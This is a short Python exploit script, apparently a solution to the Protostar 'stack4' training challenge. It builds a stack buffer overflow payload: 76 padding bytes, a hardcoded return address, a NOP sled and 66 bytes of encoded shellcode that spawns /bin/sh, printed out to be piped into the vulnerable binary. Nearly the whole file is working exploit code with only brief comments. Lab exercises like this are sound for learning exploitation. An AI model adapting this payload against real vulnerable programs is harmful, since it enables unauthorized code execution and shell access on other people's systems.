#!/bin/python
#This exploit code is intended for the stack4 binary on protostar
#Author: Cole Houston
import sys

#Checks if help flags are set to print usage statement
if (len(sys.argv)>1):
        if (sys.argv[1]=="-h"):
                print("Usage: (python "+sys.argv[0]+"; cat -) | /opt/protostar/bin/stack4")
                exit(0)
#---------------------------------------------------------------------------------------------------
#fill up buffer
buffer="A"*76

#Create area to return to in memory, \x90 (no operation instruction) will prevent a crash
nopsled="\x90"*200

#This shellcode executes /bin/sh on a 32 bit linux system without null characters, spaces, or newlines
buf =  b""
buf += b"\x6a\x31\x59\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c\x0e"
buf += b"\x07\xe2\xfa\x6b\x09\x5b\x9d\x57\x60\x6f\x25\x6a\x83"
buf += b"\xec\x64\x22\x7d\x67\x10\x79\x3d\x71\x7d\x7b\x9f\xf4"
buf += b"\x4a\xf1\x12\x1b\x1c\x1d\x31\x7d\x49\x4f\x0d\x50\x4c"
buf += b"\x25\x71\x74\xa1\xc8\xe7\xab\x1d\xf6\x44\x2e\x68\xfc"
buf += b"\xb2"  #It is 66 bytes long

#This must point to a memory address in the nopsled or at the beginning of the shellcode to successfully redirect code execution
instruction_pointer="\x50\xf8\xff\xbf" #It is in little-endian format


print(buffer+instruction_pointer+nopsled+buf)
